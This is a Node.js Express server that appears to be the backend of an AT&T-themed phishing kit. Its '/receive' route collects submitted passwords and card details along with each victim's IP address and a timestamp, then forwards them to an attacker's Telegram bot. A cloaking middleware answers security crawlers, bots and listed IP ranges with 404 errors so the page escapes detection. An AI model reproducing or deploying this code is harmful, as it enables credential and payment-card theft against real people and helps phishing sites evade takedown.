const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./Config/settings.js');
const antibot = require('./middleware/antibot');
const { sendMessageFor } = require('simple-telegram-message');
const https = require('https');
const querystring = require('querystring');


app.use(express.static(path.join(`${__dirname}`)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const sendTelegramMessage = (text) => {
  
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
      chat_id: chatId,
      text: text,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
      },
    };
    
    console.log('sent');

    const req = https.request(options, (res) => {
      // Handle the response if needed
    });

    req.write(params);
    req.end();
};


app.post('/receive', (req, res) => {
  
  let body = '';
  let message = '';
  req.on('data', (data) => {
    body += data;
  });

  req.on('end', () => {
    const postParams = querystring.parse(body);

    if (postParams.Password) {
      message += 'At&T Loginπ\n';
      message += `π ${req.connection.remoteAddress}\n`;
      message += `π ${new Date().toLocaleString()}\n`;

      for (const key in postParams) {
        message += `${key}: ${postParams[key]}\n`;
      }
    }

    if (postParams.Expiry_date) {
      message += `At&T Card details for ${postParams.visitor}\n`;
      message += `π ${req.connection.remoteAddress}\n`;
      message += `π ${new Date().toLocaleString()}\n`;

      for (const key in postParams) {
        message += `${key}: ${postParams[key]}\n`;
      }
    }
      console.log(message);

    
  });
    sendTelegramMessage(message);
  
  res.send('Data received successfully');
});




const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { getClientIp } = require('request-ip');
const { botUAList } = require('./Config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./Config/botIP.js');
const { botRefList } = require('./Config/botRef.js');
const { use } = require('express/lib/router');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        return res.status(404).send('Not Found');
    } else {
        res.sendFile(path.join(__dirname, 'index.html'));
    }
}

// Middlewares
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));


